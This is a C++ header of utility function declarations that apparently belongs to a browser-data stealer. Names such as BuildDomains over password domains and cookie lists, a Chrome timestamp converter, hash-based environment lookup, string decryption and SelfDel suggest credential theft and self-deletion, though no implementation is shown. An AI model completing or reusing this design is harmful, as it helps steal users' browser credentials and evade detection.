#pragma once
#include "Common.h"

namespace Utils
{
	BOOL IsFileExist(string path);
	string GetCurrentPath();
	wchar_t* ToUnicode(const char* ascii);
	wchar_t* ToUnicode(const char* ascii, size_t size);
	char* ToASCII(const wchar_t* unicode);
	void ReadAllText(string file, string & text);
	void ReadFileBytes(vector<byte>& bytes, string filePath);
	void WriteFileData(string filePath, string fileData);
	string DecryptStr(string bytes);
	void GetStringRegKeyW(HKEY hkey, string strValueName, string& output, string def_value);
	void GetStringRegKeyBytes(HKEY hKey, string strValueName, vector<byte>& output, const vector<byte>& def_value);
	vector<string> splitBy(string str, char delim, bool leaveEmpty = false);
	string xml_get(string text, string attribute);
	int random_number(int min, int max);
	string random_string(const size_t size);
	bool contains_record(const vector<string>& vec, string entry);
	string replaceEnvVar(string str, bool* extended);
	bool isNumeric(string str);
	string trimStr(string str, char symbol);
	unsigned long long str2ull(string str);
	unsigned long long ToUnixTimeStamp(unsigned long long chromeTimeStamp);
	string BuildDomains(vector<string> pass_domains, vector<string> cookie_list);
	string GetEnvVar(UINT nameHash);
	string GenUseragent();
	void SelfDel();
	bool DelDirectory(string path);
	char ToLower(char c);
	char ToUpper(char c);
	string ToLower(string str);
	string ToUpper(string str);
};

